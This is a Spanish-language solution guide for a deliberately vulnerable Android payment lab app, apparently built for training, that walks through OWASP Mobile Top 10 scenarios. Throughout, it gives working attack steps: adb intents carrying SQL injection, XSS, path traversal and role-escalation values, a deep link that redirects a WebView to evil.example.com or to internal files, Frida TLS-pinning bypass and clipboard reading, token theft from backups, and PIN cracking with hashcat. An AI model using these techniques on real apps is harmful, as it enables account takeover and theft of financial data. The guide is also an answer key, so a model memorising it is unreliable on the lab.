# Velion Pay Lab — Guía de Solución
---

## Requisitos previos

### Herramientas

| Herramienta | Instalación en Windows |
|---|---|
| `adb` | Descargar Android Platform Tools desde developer.android.com/tools/releases/platform-tools → extraer y añadir la carpeta al PATH |
| `Android Studio` | https://developer.android.com/studio |
| `jadx` | Descargar ZIP desde github.com/skylot/jadx/releases → extraer → añadir `bin\` al PATH |
| `apktool` | Descargar `apktool.jar` desde apktool.org y crear `apktool.bat` (ver abajo) |
| `aapt` | Incluido en `%LOCALAPPDATA%\Android\Sdk\build-tools\<version>\` |
| `Burp Suite Community` | portswigger.net |
| `Frida` | `pip install frida-tools` |
| `drozer` | github.com/WithSecureLabs/drozer (instalador MSI o `pip install drozer`) |
| `sqlite3` | Descargar binario desde sqlite.org/download (sqlite-tools-win-x64) → añadir al PATH |
| `Python 3` + `pycryptodome` | python.org → luego `pip install pycryptodome` |
| `hashcat` | Descargar binario desde hashcat.net/hashcat (hashcat-6.x.x.7z) |
| Android Backup Extractor (`abe.jar`) | github.com/nelenkov/android-backup-extractor |

### Wrapper para apktool en Windows

Crear el archivo `apktool.bat` en la misma carpeta que `apktool.jar`:

```bat
@echo off
java -jar "%~dp0apktool.jar" %*
```

### Preparación del dispositivo / emulador

```powershell
# Instalar la app
adb install velion-pay-lab.apk

# Verificar que está instalada
adb shell pm list packages | Select-String velion

# Extraer el APK del dispositivo para análisis estático
adb shell pm path com.velion.dvma
# Salida: package:/data/app/~~XXXX/com.velion.dvma-XXXX/base.apk
adb pull /data/app/~~XXXX/com.velion.dvma-XXXX/base.apk velion.apk

# Descompilar con jadx (análisis estático completo)
jadx -d velion_src velion.apk

# Descompilar con apktool (smali + manifest)
apktool d velion.apk -o velion_apktool
```

---

## M1 · Improper Credential Usage

**Vulnerabilidades:** credenciales hardcoded, token en Logcat, PIN hardcoded.

### Escenario 1 — Credenciales de pasarela hardcoded en el APK

```powershell
# Buscar credenciales en el código fuente descompilado
Select-String -Path "velion_src\*" -Pattern "GW_CLIENT_SECRET|GW_CLIENT_ID|client-secret|merchant-mobile" -Recurse

# Buscar en smali del APK descompilado
Select-String -Path "velion_apktool\smali\*" -Pattern "lab-gateway|client-secret" -Recurse
```

**Resultado esperado:**
```
GW_CLIENT_ID     = "merchant-mobile"
GW_CLIENT_SECRET = "lab-gateway-client-secret-9f2a"
```

---

### Escenario 2 — Token de sesión en Logcat

```powershell
# En la app: pulsar "Renovar sesión activa"
# Capturar el log en tiempo real
adb logcat -s VelionPay
```

**Resultado esperado:**
```
D VelionPay: Renovando sesión con Bearer demo-session-token-7f9a
```

---

### Escenario 3 — PIN de soporte hardcoded en Logcat

```powershell
# En la app: pulsar "Verificar identidad con soporte"
adb logcat -s VelionPay
```

**Resultado esperado:**
```
I VelionPay: identity-check-pin=824913
```

---

## M2 · Inadequate Supply Chain Security

**Vulnerabilidades:** actualización sin firma, validación de partner por nombre (no certificado), rollback sin integridad.

### Escenario 1 — APK de módulo descargado sin verificación de firma

```powershell
# Buscar la lógica de actualización en el código
Select-String -Path "velion_src\com\velion\dvma\m2.java" -Pattern "sha256|signature|verify|checksum"

# El sha256 viene del mismo JSON del CDN — no hay clave pública independiente
# Un atacante con control del CDN puede sustituir el APK y actualizar sha256 en el mismo JSON
```

**Resultado esperado:** no hay verificación criptográfica independiente; `sha256` es autorreferencial.

---

### Escenario 2 — Partner validado solo por nombre de paquete

```powershell
# Ver la validación en el código
Select-String -Path "velion_src\com\velion\dvma\m2.java" -Pattern "allowedPackages" -Context 0,10

# Demostración con Frida — obtener PID primero
$appPid = (adb shell pidof com.velion.dvma).Trim()
frida -U -p $appPid --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida
```

**Resultado esperado:** `allowedPackages.contains(requestedPackage)` devuelve `true` sin comprobar firma APK.

---

### Escenario 3 — Rollback sin verificación criptográfica

```powershell
# Buscar cómo se selecciona el bundle de rollback
Select-String -Path "velion_src\com\velion\dvma\m2.java" -Pattern "rollbackRelease|provenance" -Context 0,8

# release-channel.json es un archivo local que puede modificarse
# en un dispositivo rooteado antes de que la app lo procese
adb shell run-as com.velion.dvma ls files/
```

---

## M3 · Insecure Authentication / Authorization

**Vulnerabilidades:** PERSONAL con acceso de OPS, rol override vía Intent, logout solo local.

### Escenario 1 — Rol PERSONAL accede al panel de operaciones

```powershell
# Abrir el módulo M3 con el rol por defecto (PERSONAL)
adb shell am start -n com.velion.dvma/.m3

# Pulsar "Abrir panel de operaciones" — PERSONAL tiene acceso igual que OPS
# Verificar en el código la condición rota:
Select-String -Path "velion_src\com\velion\dvma\m3.java" -Pattern "openOperationsPanel" -Context 0,5
```

**Resultado esperado:** el panel muestra "Cola de liquidación / Revisión de contracargos" con rol PERSONAL.

---

### Escenario 2 — Escalada de rol vía Intent extra

```powershell
# Inyectar rol arbitrario al lanzar la Activity
adb shell am start -n com.velion.dvma/.m3 --es role "ADMIN"

# Pulsar "Cambiar contexto de cuenta"
# El rol en FeatureStore queda como "ADMIN" sin validación del servidor
```

**Resultado esperado:** `Rol: ADMIN` en la pantalla; ninguna petición al backend.

---

### Escenario 3 — Sesión remota activa tras cerrar sesión local

```powershell
# Pulsar "Cerrar sesión" en la app
# Verificar que el token sigue en SharedPreferences
adb shell run-as com.velion.dvma cat shared_prefs/com.velion.dvma_preferences.xml

# El token nunca se revoca en el servidor — sigue válido 72 horas
Select-String -Path "velion_src\com\velion\dvma\m3.java" -Pattern "signOut" -Context 0,8
```

**Resultado esperado:** `logged_in=false` en local pero el token sigue operativo en el servidor.

---

## M4 · Insufficient Input / Output Validation

**Vulnerabilidades:** open redirect en WebView, path traversal en descarga, XSS en búsqueda.

### Escenario 1 — Open redirect / LFI vía deep link

```powershell
# Redirigir el WebView a un sitio externo
adb shell am start -a android.intent.action.VIEW `
  -d "velionpay://portal?url=https://evil.example.com" `
  com.velion.dvma

# Leer archivos internos de la app (LFI)
adb shell am start -a android.intent.action.VIEW `
  -d "velionpay://portal?url=file:///data/data/com.velion.dvma/shared_prefs/account_cache.xml" `
  com.velion.dvma
```

**Resultado esperado:** el WebView carga el dominio arbitrario o muestra el XML de SharedPreferences.

---

### Escenario 2 — Path traversal en nombre de archivo de estado

```powershell
# Sobreescribir un archivo fuera del directorio "statements/"
adb shell am start -n com.velion.dvma/.m4 `
  --es name "../../../../../../data/data/com.velion.dvma/files/audit.txt"

# Luego pulsar "Descargar estado de cuenta"
```

**Resultado esperado:** `Ruta: /sdcard/.../../../files/audit.txt` — el archivo se escribe en una ruta no autorizada.

---

### Escenario 3 — XSS reflejado en WebView de búsqueda

```powershell
# Inyectar payload HTML/JS en el campo de búsqueda
adb shell am start -n com.velion.dvma/.m4 `
  --es query "<img src=x onerror=alert(document.cookie)>"

# Luego pulsar "Buscar referencia de transferencia"
# El valor de query se concatena directamente en el HTML sin escapar
```

**Resultado esperado:** el WebView ejecuta el script; se muestra el alert con cookies/storage.

---

## M5 · Insecure Communication

**Vulnerabilidades:** HTTP con token de auth, TLS completamente deshabilitado.

### Escenario 1 — Token Bearer enviado por HTTP

```powershell
# Configurar Burp Suite como proxy en el dispositivo (puerto 8080)
# Settings > WiFi > Proxy manual > IP_DEL_HOST:8080

# Pulsar "Sincronizar perfil" en la app
# Capturar en Burp:
```

**Tráfico interceptado esperado:**
```
GET http://api.velion.local/profile HTTP/1.1
Authorization: Bearer demo-session-token-7f9a
```

---

### Escenario 2 — Bypass de validación TLS

```powershell
# Levantar mitmproxy
mitmproxy --listen-port 8080

# Pulsar "Verificar cotización de envío"
# La app acepta cualquier certificado (TrustManager vacío + HostnameVerifier = true)

# Verificar en el código el TrustManager que acepta todo:
Select-String -Path "velion_src\com\velion\dvma\m5.java" -Pattern "checkServerTrusted|HostnameVerifier" -Context 0,10
```

**Resultado esperado:** mitmproxy muestra el tráfico HTTPS descifrado; la app no lanza `SSLHandshakeException`.

---

### Escenario 3 — Estado de servicios (referencia)

```powershell
# Este escenario no tiene vector de ataque activo;
# sirve para contrastar con los anteriores.
# Pulsar "Estado de servicios" en la app
```

---

## M6 · Inadequate Privacy Controls

**Vulnerabilidades:** PII en SharedPreferences, datos financieros en portapapeles, estado sin redactar.

### Escenario 1 — PII completo en SharedPreferences

```powershell
# Pulsar "Preparar caso de soporte" en la app
# Leer el archivo generado
adb shell run-as com.velion.dvma cat shared_prefs/support_draft.xml
```

**Resultado esperado:**
```xml
<string name="customer_context">
  email=demo.user@velion.local;phone=+50255550142;account=ACC-1042;balance=18425.75
</string>
```

---

### Escenario 2 — Datos bancarios en el portapapeles del sistema

```powershell
# Pulsar "Copiar datos de beneficiario" en la app
# Leer el portapapeles con Frida
$appPid = (adb shell pidof com.velion.dvma).Trim()
frida -U -p $appPid -e @"
Java.perform(function() {
  var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
  var cm = ctx.getSystemService('clipboard');
  console.log('Portapapeles: ' + cm.getPrimaryClip().getItemAt(0).getText());
});
"@
```

**Resultado esperado:** `Portapapeles: Acme Services · AC-8821 · routing 110000`

---

### Escenario 3 — Captura de pantalla con datos sin redactar

```powershell
# Pulsar "Vista previa del estado de cuenta" en la app
adb shell screencap -p /sdcard/leak.png
adb pull /sdcard/leak.png

# La imagen contiene email, cuenta y saldo en texto claro
```

---

## M7 · Insufficient Binary Protections

**Vulnerabilidades:** `debuggable=true`, `trusted_device` sin Play Integrity, exposición de library/ABI.

### Escenario 1 — App debuggable en producción

```powershell
# Verificar flag en el manifest descompilado
Select-String -Path "velion_apktool\AndroidManifest.xml" -Pattern "debuggable"
# → android:debuggable="true"

# Adjuntar debugger JDWP
adb jdwp
# Tomar el PID de la app y hacer forward
adb forward tcp:8700 jdwp:<PID>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
```

**Resultado esperado:** jdb se conecta y permite inspeccionar variables en tiempo de ejecución.

---

### Escenario 2 — Activar funciones de pago sin Play Integrity

```powershell
# Inyectar trusted_device=true vía Intent
adb shell am start -n com.velion.dvma/.m7 --ez trusted_device true

# Pulsar "Activar funciones de pago"
```

**Resultado esperado:** `Dispositivo de confianza: true` y funciones de pago habilitadas, sin ninguna verificación real del dispositivo.

---

### Escenario 3 — Exposición de nombre de librería y ABI

```powershell
# Pulsar "Verificar capacidad nativa" en la app
# Ver el nombre de la librería y ABI expuestos en pantalla

# Buscar referencias en el código
Select-String -Path "velion_src\com\velion\dvma\m7.java" -Pattern "libvelionpay|SUPPORTED_ABIS"
```

**Resultado esperado:** `Biblioteca: libvelionpay.so / ABI: arm64-v8a` — información útil para un atacante que busca vulnerabilidades en la capa nativa.

---

## M8 · Security Misconfiguration

**Vulnerabilidades:** AdminActivity exported sin auth, WebView + file access en soporte, backup de token.

### Escenario 1 — Acceso directo a AdminActivity (exported=true)

```powershell
# Cualquier app (o adb) puede invocarla sin autenticación
adb shell am start -n com.velion.dvma/.AdminActivity

# Verificar con drozer
drozer console connect
# dz> run app.activity.info -a com.velion.dvma
# dz> run app.activity.start --component com.velion.dvma com.velion.dvma.AdminActivity
```

**Resultado esperado:** "Consola de Operaciones" visible sin haber hecho login.

---

### Escenario 2 — WebView con file access en centro de soporte

```powershell
# Pulsar "Abrir centro de soporte" — carga file:///android_asset/support/index.html
# con setAllowFileAccess(true) y JS habilitado

# Usar el deep link para redirigir el WebView a un archivo interno
adb shell am start -a android.intent.action.VIEW `
  -d "velionpay://portal?url=file:///data/data/com.velion.dvma/shared_prefs/account_cache.xml" `
  com.velion.dvma
```

---

### Escenario 3 — Token de sesión en Android Backup

```powershell
# Pulsar "Crear snapshot de diagnóstico" en la app
# Generar backup del APK
adb backup -noapk com.velion.dvma -f backup.ab

# Desempaquetar con Android Backup Extractor
java -jar abe.jar unpack backup.ab backup.tar ""
tar xf backup.tar

# Leer SharedPreferences extraídas del backup
type apps\com.velion.dvma\sp\diagnostics.xml
```

**Resultado esperado:**
```xml
<string name="session">demo-session-token-7f9a</string>
<string name="last_user">demo.user@velion.local</string>
```

---

## M9 · Insecure Data Storage

**Vulnerabilidades:** token en SharedPreferences, SQL injection, auditoría en texto plano.

### Escenario 1 — Token de sesión en SharedPreferences

```powershell
# Pulsar "Abrir caché de cuenta offline" en la app
adb shell run-as com.velion.dvma cat shared_prefs/account_cache.xml
```

**Resultado esperado:**
```xml
<string name="session_token">demo-session-token-7f9a</string>
<string name="email">demo.user@velion.local</string>
<string name="account_number">001-7788-1042</string>
```

---

### Escenario 2 — SQL Injection en historial de transacciones

```powershell
# Payload básico — volcar todas las filas
adb shell am start -n com.velion.dvma/.m9 --es ref "x' OR '1'='1"
# Luego pulsar "Buscar en historial de transacciones"

# Payload con comentario SQL
adb shell am start -n com.velion.dvma/.m9 --es ref "x' OR 1=1 --"
# Luego pulsar "Buscar en historial de transacciones"

# Acceso directo a la base de datos (dispositivo rooteado / emulador)
adb shell run-as com.velion.dvma sqlite3 databases/velion.db "SELECT * FROM transactions"
```

**Resultado esperado:** todos los registros de `transactions` se muestran en pantalla, independientemente del valor de `ref`.

---

### Escenario 3 — Archivo de auditoría con token en texto plano

```powershell
# Pulsar "Exportar auditoría local" en la app
adb shell run-as com.velion.dvma cat files/audit.txt
```

**Resultado esperado:**
```
USER=demo.user@velion.local
SESSION=demo-session-token-7f9a
```

---

## M10 · Insufficient Cryptography

**Vulnerabilidades:** MD5 sin salt, AES/ECB con clave hardcoded, AES/CBC con IV cero.

### Escenario 1 — PIN protegido con MD5 sin salt

```powershell
# Pulsar "Proteger PIN offline" — obtener el hash de pantalla o SharedPreferences

# Identificar el algoritmo en el código
Select-String -Path "velion_src\com\velion\dvma\m10.java" -Pattern "md5|MD5" -Context 0,6

# Convertir el Base64 a hex y crackear con hashcat
python -c "import base64; print(base64.b64decode('HASH_BASE64_AQUI').hex())" | Set-Content -NoNewline hash.txt
.\hashcat.exe -a 3 -m 0 hash.txt ?d?d?d?d
# PINs de 4 dígitos se rompen en segundos

# Alternativa con tabla arcoíris online: crackstation.net
```

**Resultado esperado:** PIN `2468` recuperado en segundos.

---

### Escenario 2 — AES/ECB con clave hardcoded

```powershell
# Extraer la clave del código descompilado
Select-String -Path "velion_src\com\velion\dvma\m10.java" -Pattern "AES_KEY|VelionLabKey"
# → AES_KEY = "VelionLabKey2026"

# Pulsar "Cifrar borrador de transferencia" — copiar el payload de pantalla

# Descifrar con Python (PowerShell here-string)
@"
from Crypto.Cipher import AES
import base64

key     = b'VelionLabKey2026'
payload = 'PAYLOAD_BASE64_DE_PANTALLA'
ct      = base64.b64decode(payload)
cipher  = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(ct))
"@ | python
```

**Resultado esperado:** `b'TRX|ACC-1042|1250.00|USD\x08\x08\x08\x08\x08\x08\x08\x08'`

---

### Escenario 3 — AES/CBC con IV fijo en ceros

```powershell
# Pulsar "Preparar sesión offline" — copiar el payload de pantalla

# Descifrar con Python (clave y IV conocidos estáticamente)
@"
from Crypto.Cipher import AES
import base64

key     = b'VelionLabKey2026'
iv      = b'\x00' * 16
payload = 'PAYLOAD_BASE64_DE_PANTALLA'
ct      = base64.b64decode(payload)
cipher  = AES.new(key, AES.MODE_CBC, iv)
pt      = cipher.decrypt(ct)
print(pt[:-pt[-1]])
"@ | python
```

**Resultado esperado:** `b'demo-session-token-7f9a'`

---

## Resumen rápido de vectores

| # | Herramienta principal | Comando de entrada |
|---|---|---|
| M1 | `adb logcat`, `jadx` + `Select-String` | Interacción en la app + búsqueda en fuente |
| M2 | `jadx` + `Select-String`, Burp Suite | Análisis estático + intercepción de red |
| M3 | `adb shell am start` | `--es role "ADMIN"` |
| M4 | `adb shell am start` | `--es query "<img onerror=...>"` / deep link `?url=file://` |
| M5 | Burp Suite / mitmproxy | Proxy en el dispositivo |
| M6 | `adb shell run-as`, Frida | `cat shared_prefs/support_draft.xml` |
| M7 | `jdb`, `adb shell am start` | `--ez trusted_device true` |
| M8 | `adb shell am start`, `abe.jar` + `tar` | `.AdminActivity` directo + backup extract |
| M9 | `adb shell run-as`, `sqlite3` | `--es ref "x' OR 1=1 --"` |
| M10 | `jadx` + `Select-String`, Python + `hashcat.exe` | Clave `VelionLabKey2026` + IV `\x00*16` |
